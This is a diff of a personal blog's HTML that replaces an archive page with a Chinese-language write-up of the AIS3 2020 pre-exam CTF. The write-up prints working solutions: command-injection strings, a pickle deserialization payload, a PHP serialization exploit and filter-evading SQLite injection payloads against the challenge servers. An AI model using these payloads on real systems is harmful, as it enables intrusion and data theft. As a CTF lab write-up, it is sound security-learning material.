@@ -6,21 +6,28 @@
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Halloworld-website">
-    <title>所有文章: 2020 - Halloworld-website</title>
+    <title>Ais3_2020_pre_exam_writeup - Halloworld-website</title>
     <meta name="author" content="halloworld">
     
     
         <link rel="icon" href="http://halloworld.tw/assets/images/profile.jpg">
     
     
-    <script type="application/ld+json">{}</script>
-    <meta property="og:type" content="blog">
-<meta property="og:title" content="Halloworld-website">
-<meta property="og:url" content="http://halloworld.tw/archives/2020/index.html">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"halloworld","sameAs":["https://github.com/william31212","https://www.facebook.com/pinhan.huang.5","https://www.linkedin.com/in/%E5%93%81%E7%BF%B0-%E9%BB%83-9b80a2180/","https://www.instagram.com/pinhan0601/?hl=zh-tw"],"image":"profile.jpg"},"articleBody":"AIS3-2020-pre-exam簡述\n有一些題目跟去年一樣，應該是配合My-first-ctf吧\n跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞\n放一下scoreboard紀錄一下，我是halloworld\nhttps://i.imgur.com/YPUe7VZ.jpg\n\n\n\nCrypto\n🦕Brontosaurus\n\njsfuck\n這題很像跟去年一樣，把整體字串顛倒過來拿去chrome的console執行就可以了\n有online-tool\nhttps://codebeautify.org/reverse-string\n\n\n\n\n🦖 T-Rex\n\n這題是程式競賽吧X\n就寫腳本\nhttps://pastebin.com/2STiQQXv\n\n\n\n\n🐙 Octopus\n\n關鍵字是BB84，量子加密\nhttps://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC\n\n\n已知對方的basis與量子偏振，可與自己的相比較，得出共有的key\nprint(int(bit_stream[:400],2) ^ FLAG)\n又知道key(取了後面400個bit)跟flag做xor的結果，透過XOR的交換率能知道結果\nscript\n\n\n李永樂老師影片蠻淺顯易懂的\nhttps://www.youtube.com/watch?v=dgNyGjwwYpk\n\n\n\n\n\nmisc\n💤Piquero\n\n點字，工人智慧題目\n啾啾鞋的影片有介紹過哦\nhttps://www.youtube.com/watch?v=1aop1ursHVE\n\n\n\n\n🐥Karuego\n\n加密文件的明文攻擊\n參考自(https://blog.csdn.net/hustcw98/article/details/82392993)\n\n\n用binwalk -e能夠將檔案與圖片切開\n偽造一個壓縮檔，將已知的圖片壓縮(請利用linux-zip壓縮，windows會爛)，google能找到\nhttps://pm1.narvii.com/6182/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg\n\n\n設定好pkcrack然後破解\n\n\n🌱Soy\n\nQR_code修復，點到眼睛脫窗，然後Extract QR Information\nref: https://blog.xiafeng2333.top/ctf-13/\ntool: https://merricx.github.io/qrazybox/\n找完der結果\n\n\n\n\n\n👑Saburo\n\n輸入正確字元時間會較高，錯誤則較低\n寫腳本爆破，每個字元做五次取平均，pwntools真香，爆了2小時\nhttps://pastebin.com/kEzTjP3u\n\n\n\n\n👿Shichirou\n\n這題得構造一個tar檔案，tar檔案必須size小於65536\n為了讓出來的讓sha1值一樣，必須link-file(從guess.txt連到../flag.txt)by pass，來繞過這段\n  12a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])\n\npwntools真香\n\nhttps://pastebin.com/RfJPeLLn\n\n\nLinuxTool-ln\n\n\n\nReverse\n🍍TsaiBro\n\n這題也是之前的，打開ida或ghidra，能拿到表與規則\n規則則是敲打密碼\ntap-code\n\n\n\n\n🎹Fallen Beat\n\njava逆向\n利用jadx-GUI查看邏輯，修改邏輯請用jbe\n可以發現裡面有setvalue()，將MaxCombo跟total改成0，進行patch\n拆包\njar -xf  Fallen_Beat.jar\n\n\n更新jar裡元素\njar -uf Fallen_Beat.jar Control/GameControl.class\n\n\n\n\n等三分鐘就有flag，如果是windows的用戶，通常會有解析度導致flag出不來，可以透過patch視窗大小來調整\n不過後來想想很像可以直接把生flag那段code拿來執行就好了\nref: https://www.talksinfo.com/how-to-edit-class-file-from-a-jar/\n\n\n🧠 Stand up!Brain\n\nbrainfuck\nida或ghidra理一下邏輯，結果發現裡面有一段brainfuck\n然後在路邊撿到一段能翻brainfuck的c_code\nhttps://gist.github.com/maxcountryman/1699708\n\n\n\n\n\nWeb\n🐿️Squirrel\nF12看一下，能夠撿到apihttps://squirrel.ais3.org/api.php?get=%2Fetc%2Fpasswd\n於是我們拿api的code\n?get=./api.php\n\n\n然後發現shell_exec，是個command-injection\n$output = shell_exec(\\&quot;cat &#39;$file&#39;\\&quot;);\\n\n&#39;;ls /;&#39;\n\n\n5qu1rr3l_15_4_k1nd_0f_b16_r47.txt\n&#39;;cat /5qu1rr3l_15_4_k1nd_0f_b16_r47.txt;&#39;\n\n\n\n\n🦈Shark\n\n這題去年出過，SSRF+LFI\nLFI(file:///)，讀取linux敏感檔案，查看內網ip\nhttp://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421\n\n\nhttps://shark.ais3.org/?path=http://172.22.0.2/flag\n\n\n🐘Elephant\n\n要先想到.git\n利用git-dumper把code dump下來\n發現source code\nphp-deserialize\n利用strcmp的缺陷，去構造陣列比較  1234567891011121314&lt;?phpclass User&#123;    public $name, $token;    function __construct($name, $token) &#123;        $this-&gt;name = $name;        $this-&gt;token = $token;    &#125;    function canReadFlag() &#123;        return strcmp($flag, $this-&gt;token) == 0;    &#125;&#125;$arr = array();$tmp = new User('AAA', $aaa);echo base64_encode(serialize($tmp));\n\n\n\n\n\n🐍Snake\n\npython pickle的反序列化，一樣構造\n參考自: https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#/5/9\nscript  1234567import osimport pickleimport base64class A(object):\tdef __reduce__(self):\t\treturn (eval, (\"open('/flag').read()\",))print(base64.b64encode(pickle.dumps(A())))\n\n\n\n🦉Owl\n\n登入admin/admin，看source-code有source\n&lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;&lt;a style=&quot;color: white&quot; href=&quot;/?source&quot;&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt;\n\n\nsqlite的sqli\n過濾方式，把東西寫三次繞過，最後用分號切開語句，後面接註解\n  123$bad = [&apos; &apos;, &apos;/*&apos;, &apos;*/&apos;, &apos;select&apos;, &apos;union&apos;, &apos;or&apos;, &apos;and&apos;, &apos;where&apos;, &apos;from&apos;, &apos;--&apos;];$username = str_ireplace($bad, &apos;&apos;, $username);$username = str_ireplace($bad, &apos;&apos;, $username);\n\npayload\n\n先猜column(發現有3個)\n1&apos;///*******///uniuniuniononon///******///selselselectectect///******///1///******///,2///******///,3;///******\n\n查表，看column\n1&apos;///*******///uniuniuniononon///******///selselselectectect///******///1///******///,group_concat(sql)///******///,3///******///frfrfromomom///******///sqlite_master;///******\n-查garbage，就有flag嘞\n1&apos;///*******///uniuniuniononon///******///selselselectectect///******///1///******///,group_concat(name||value)///******///,3///******///frfrfromomom///******///garbage;///***\n\n\n\n\n\n\nPwn\n👻 BOF\n就buffer-overflow，去年初過\n\n\n\n","dateCreated":"2020-06-10T11:44:53+08:00","dateModified":"2020-06-10T12:05:29+08:00","datePublished":"2020-06-10T11:44:53+08:00","description":"","headline":"Ais3_2020_pre_exam_writeup","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/"},"publisher":{"@type":"Organization","name":"halloworld","sameAs":["https://github.com/william31212","https://www.facebook.com/pinhan.huang.5","https://www.linkedin.com/in/%E5%93%81%E7%BF%B0-%E9%BB%83-9b80a2180/","https://www.instagram.com/pinhan0601/?hl=zh-tw"],"image":"profile.jpg","logo":{"@type":"ImageObject","url":"profile.jpg"}},"url":"http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/","keywords":"ais3, ctf, writeup"}</script>
+    <meta name="description" content="AIS3-2020-pre-exam簡述 有一些題目跟去年一樣，應該是配合My-first-ctf吧 跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞 放一下scoreboard紀錄一下，我是halloworld https://i.imgur.com/YPUe7VZ.jpg    Crypto 🦕Brontosaurus  jsfuck 這題很像跟去年一樣，把整體字串顛倒過來拿去ch">
+<meta name="keywords" content="ais3,ctf,writeup">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="Ais3_2020_pre_exam_writeup">
+<meta property="og:url" content="http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/index.html">
 <meta property="og:site_name" content="Halloworld-website">
+<meta property="og:description" content="AIS3-2020-pre-exam簡述 有一些題目跟去年一樣，應該是配合My-first-ctf吧 跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞 放一下scoreboard紀錄一下，我是halloworld https://i.imgur.com/YPUe7VZ.jpg    Crypto 🦕Brontosaurus  jsfuck 這題很像跟去年一樣，把整體字串顛倒過來拿去ch">
 <meta property="og:locale" content="zh-tw">
+<meta property="og:image" content="https://i.imgur.com/hM1J6Hs.png">
+<meta property="og:updated_time" content="2020-06-10T04:05:29.328Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halloworld-website">
+<meta name="twitter:title" content="Ais3_2020_pre_exam_writeup">
+<meta name="twitter:description" content="AIS3-2020-pre-exam簡述 有一些題目跟去年一樣，應該是配合My-first-ctf吧 跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞 放一下scoreboard紀錄一下，我是halloworld https://i.imgur.com/YPUe7VZ.jpg    Crypto 🦕Brontosaurus  jsfuck 這題很像跟去年一樣，把整體字串顛倒過來拿去ch">
+<meta name="twitter:image" content="https://i.imgur.com/hM1J6Hs.png">
     
     
         
@@ -59,7 +66,7 @@
         
     
 
-<header id="header" data-behavior="1">
+<header id="header" data-behavior="4">
     <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
     <div class="header-title">
         <a class="header-title-link" href="/ ">Halloworld-website</a>
@@ -82,7 +89,7 @@
         
     
 
-<nav id="sidebar" data-behavior="1">
+<nav id="sidebar" data-behavior="4">
     <div class="sidebar-container">
         
             <div class="sidebar-profile">
@@ -190,26 +197,22 @@
 </nav>
 
             
-            <div id="main" data-behavior="1"
+            <div id="main" data-behavior="4"
                  class="
                         hasCoverMetaIn
                         ">
                 
-    <section class="postShorten-group main-content-wrap">
+<article class="post">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/AIS3-2020-pre-exam-writeup/">
-                            Ais3_2020_pre_exam_writeup
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            Ais3_2020_pre_exam_writeup
+        </h1>
+    
+    
+        <div class="post-meta">
     <time datetime="2020-06-10T11:44:53+08:00">
 	
 		    6月 10, 2020
@@ -218,10 +221,13 @@
     
 </div>
 
-            </div>
-            
-                <div class="postShorten-content">
-                    <h1 id="AIS3-2020-pre-exam"><a href="#AIS3-2020-pre-exam" class="headerlink" title="AIS3-2020-pre-exam"></a>AIS3-2020-pre-exam</h1><h2 id="簡述"><a href="#簡述" class="headerlink" title="簡述"></a>簡述</h2><ul>
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="AIS3-2020-pre-exam"><a href="#AIS3-2020-pre-exam" class="headerlink" title="AIS3-2020-pre-exam"></a>AIS3-2020-pre-exam</h1><h2 id="簡述"><a href="#簡述" class="headerlink" title="簡述"></a>簡述</h2><ul>
 <li>有一些題目跟去年一樣，應該是配合My-first-ctf吧</li>
 <li>跟去年比起來，我覺得自己成長蠻多的，覺得去年der我是菜雞</li>
 <li>放一下scoreboard紀錄一下，我是halloworld<ul>
@@ -448,321 +454,95 @@
 </li>
 </ul>
 
-                    
-                        
+            
 
-                    
-                    
-                        <p>
-                            <a href="/post/AIS3-2020-pre-exam-writeup/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/GSS-03/">
-                            GSS-03
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2020-04-21T21:34:32+08:00">
-	
-		    4月 21, 2020
-    	
-    </time>
-    
-</div>
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">標籤</span><br>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/ais3/">ais3</a> <a class="tag tag--primary tag--small t-link" href="/tags/ctf/">ctf</a> <a class="tag tag--primary tag--small t-link" href="/tags/writeup/">writeup</a>
 
             </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><ul>
-<li>沒想到更新已經是兩個月後的事了，結果因為專題關係，我離開GSS了</li>
-<li>不過多了許多時間弄專題跟資訊安全研究，還有看棒球</li>
-</ul>
-<h2 id="Course4-MVC"><a href="#Course4-MVC" class="headerlink" title="Course4 MVC"></a>Course4 MVC</h2><ul>
-<li>使用<code>C#</code>來寫MVC架構，用原生MVC中的Html Helper Function</li>
-<li>Model(資料模型)、View(秀出頁面)、Controller(資料邏輯判斷)</li>
-</ul>
-<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><h3 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h3><ul>
-<li>字串串接SQL語句，SQL-injeciton風險</li>
-<li>T-SQL(拿系統時間function，新舊版的不同)<ul>
-<li>可能遇到的風險<ul>
-<li>當用戶使用舊版的MSSQL，遇到新語句會發生bug</li>
-</ul>
-</li>
-<li><code>SYSDATETIME()</code></li>
-<li><code>GETDATE()</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><ul>
-<li><code>Html.HiddenFor()</code>可以藏值，可以使用<code>model_binding</code>拿<code>BOOK_ID</code>不用querystring</li>
-</ul>
-<h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3><ul>
-<li><code>SELECT SCOPE_IDENTITY()</code> 可拿編號</li>
-<li>HTMLencode prevent <code>&lt;BR&gt;</code></li>
-<li>html attr =&gt; MVC method (e.g. Querystring)</li>
-</ul>
-<h3 id="Coding-Style"><a href="#Coding-Style" class="headerlink" title="Coding Style"></a>Coding Style</h3><ul>
-<li>專案名稱前面大寫，取名漂亮一些</li>
-<li>區域變數要用小寫</li>
-<li>Vscode plugin參與團隊專案會有狀況出現</li>
-<li>命名命的長然後清楚為原則，if一行還是要大括號</li>
-<li>sql更改欄位名稱不要有符號</li>
-<li>enum 定義變數較彈性<ul>
-<li><a href="https://docs.microsoft.com/zh-tw/dotnet/api/system.enum?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/dotnet/api/system.enum?view=netframework-4.8</a></li>
-</ul>
-</li>
-<li>駝峰式命名<ul>
-<li><a href="https://zh.wikipedia.org/wiki/%E9%A7%9D%E5%B3%B0%E5%BC%8F%E5%A4%A7%E5%B0%8F%E5%AF%AB" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%A7%9D%E5%B3%B0%E5%BC%8F%E5%A4%A7%E5%B0%8F%E5%AF%AB</a></li>
-</ul>
-</li>
-<li>變數名稱<del>bi</del> XD</li>
-<li><del>讓自己的變數命名死去</del> KEEP GOING!</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/GSS-03/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/GSS-02/">
-                            GSS-02
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2020-02-22T14:16:48+08:00">
-	
-		    2月 22, 2020
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="Course3-前端的基礎訓練"><a href="#Course3-前端的基礎訓練" class="headerlink" title="Course3 前端的基礎訓練"></a>Course3 前端的基礎訓練</h2><ul>
-<li>這是使用kendo-ui做的一個圖書管理系統，主要是熟習整個lib的操作</li>
-</ul>
-<h3 id="以下分享各種坑"><a href="#以下分享各種坑" class="headerlink" title="以下分享各種坑"></a>以下分享各種坑</h3><ul>
-<li>新增<ul>
-<li>日期驗證，給年份月份，即可通過驗證</li>
-</ul>
-</li>
-</ul>
-<h3 id="建議的寫法"><a href="#建議的寫法" class="headerlink" title="建議的寫法"></a>建議的寫法</h3><h4 id="清除時，能夠將資料清空，方便下一筆輸入"><a href="#清除時，能夠將資料清空，方便下一筆輸入" class="headerlink" title="清除時，能夠將資料清空，方便下一筆輸入"></a>清除時，能夠將資料清空，方便下一筆輸入</h4><ul>
-<li>可以將清空包在function裡</li>
-<li>能夠做二次確認，避免誤觸</li>
-</ul>
-<h4 id="coding-style"><a href="#coding-style" class="headerlink" title="coding style"></a>coding style</h4><ul>
-<li>div包div不需縮排</li>
-<li>style重複性過高，能夠將其劃分到css做整理</li>
-<li>CSS做整合</li>
-<li>統一利用kendo取值，會比JQuery來的好，因為kendo有部分有例外處理</li>
-<li>格式能夠整合再一起，(ex: yyyy-MM-dd)</li>
-<li>注意id 與class的使用</li>
-</ul>
-<h3 id="當時學的小技巧，雖然很像大家都知道"><a href="#當時學的小技巧，雖然很像大家都知道" class="headerlink" title="當時學的小技巧，雖然很像大家都知道"></a>當時學的小技巧，雖然很像大家都知道</h3><blockquote>
-<p>VS 按F12可以回追function的來源位置</p>
-</blockquote>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/GSS-02/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/GSS-01/">
-                            GSS_01
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2020-02-17T20:37:33+08:00">
-	
-		    2月 17, 2020
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="Course1-環境安裝"><a href="#Course1-環境安裝" class="headerlink" title="Course1 環境安裝"></a>Course1 環境安裝</h2><ul>
-<li>安裝VS跟nuget，SSMS，跟公司的一些東西</li>
-</ul>
-<h2 id="Course2-MS-SQL語法練習"><a href="#Course2-MS-SQL語法練習" class="headerlink" title="Course2 MS-SQL語法練習"></a>Course2 MS-SQL語法練習</h2><ul>
-<li>當初寫的時候，就按照學校考試的方式寫，完全沒考慮過效率或者可讀性。寫出來的結果也符合期待，不過實際上是不能這樣子的</li>
-</ul>
-<h3 id="以下分享各種坑"><a href="#以下分享各種坑" class="headerlink" title="以下分享各種坑"></a>以下分享各種坑</h3><ul>
-<li><p>inner join / left join / right join沒有考慮，全部寫inner join，導致有SQL-Query查出來會有部分資料會遺失</p>
-<ul>
-<li>各種JOIN的圖<ul>
-<li><a href="https://i.stack.imgur.com/VQ5XP.png" target="_blank" rel="noopener">https://i.stack.imgur.com/VQ5XP.png</a><blockquote>
-<p>當時腦袋模糊不清</p>
-</blockquote>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>列出前五名的值???</p>
-<ul>
-<li>當時天真的我就直接TOP(5)，發現同分的都沒列出</li>
-<li>解法就是With ties</li>
-</ul>
-</li>
-<li><p>列出一季當中的數量，當時用hardcode寫法</p>
-<ul>
-<li>問題: 一季的規則變怎辦</li>
-<li>解法: 把規則放在TABLE，萬一規則變只要改表</li>
-</ul>
-</li>
-<li><p>會忘記規定，數字要三位一撇</p>
-<ul>
-<li>解法: <a href="https://harry-lin.blogspot.com/2018/12/mssql.html" target="_blank" rel="noopener">https://harry-lin.blogspot.com/2018/12/mssql.html</a></li>
-</ul>
-</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/GSS-01/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/GSS-00/">
-                            GSS_00
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2020-02-16T23:23:15+08:00">
-	
-		    2月 16, 2020
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <p><strong>實習系列文預告，將會有不定期更新</strong></p>
-<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><ul>
-<li>因為先前課業繁忙，無法空出時間來打文章，之後有時間再補上一些心得文</li>
-<li>學校有引薦實習的機會，然後我就選了一家離家裡較近的公司</li>
-<li>正在整理新人訓期間的一些筆記，將來會做分享</li>
-</ul>
-<h2 id="實習地點"><a href="#實習地點" class="headerlink" title="實習地點"></a>實習地點</h2><ul>
-<li>GSS叡揚資訊股份有限公司<ul>
-<li>10461台北市中山區德惠街9號</li>
-<li><a href="https://www.gss.com.tw/" target="_blank" rel="noopener">https://www.gss.com.tw/</a></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>很像最近剛變成上市公司</p>
-</blockquote>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/GSS-00/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    <div class="pagination-bar">
-    <ul class="pagination">
         
         
-        <li class="pagination-number">第 1 頁 共 1 頁</li>
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/GSS-03/" data-tooltip="GSS-03" aria-label="下一篇: GSS-03">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <!-- <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/" title="分享到 Facebook">
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li> -->
+        
+            
+            
+            <!-- <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/" title="分享到 Google+">
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li> -->
+        
+        
+            
+                <li class="post-action">
+                    <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
     </ul>
 </div>
 
-</section>
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
 
 
 
@@ -773,6 +553,99 @@
 </footer>
 
             </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/post/GSS-03/" data-tooltip="GSS-03" aria-label="下一篇: GSS-03">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <!-- <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/" title="分享到 Facebook">
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li> -->
+        
+            
+            
+            <!-- <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/" title="分享到 Google+">
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li> -->
+        
+        
+            
+                <li class="post-action">
+                    <a class="post-action-btn btn btn--default" href="#disqus_thread">
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/">
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/">
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
             
         </div>
         
@@ -818,7 +691,25 @@
 <div id="cover" style="background-image:url('/assets/images/trail.jpg');"></div>
         <!--SCRIPTS-->
 <script src="/assets/js/script-dbd16rvloemmuxdzniplmnxxvwoz24eya9wol0b7vvmlokgqsjivmb8dnscy.min.js"></script>
-<!--SCRIPTS END--><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<!--SCRIPTS END-->
+
+    
+        <script>
+             var disqus_config = function () {
+                 this.page.url = 'http://halloworld.tw/post/AIS3-2020-pre-exam-writeup/';
+                 
+                    this.page.identifier = 'post/AIS3-2020-pre-exam-writeup/';
+                 
+             };
+            (function() {
+                var d = document, s = d.createElement('script');
+                var disqus_shortname = 'halloworld';
+                s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
 </script>
@@ -836,6 +727,7 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+    
 
 
 
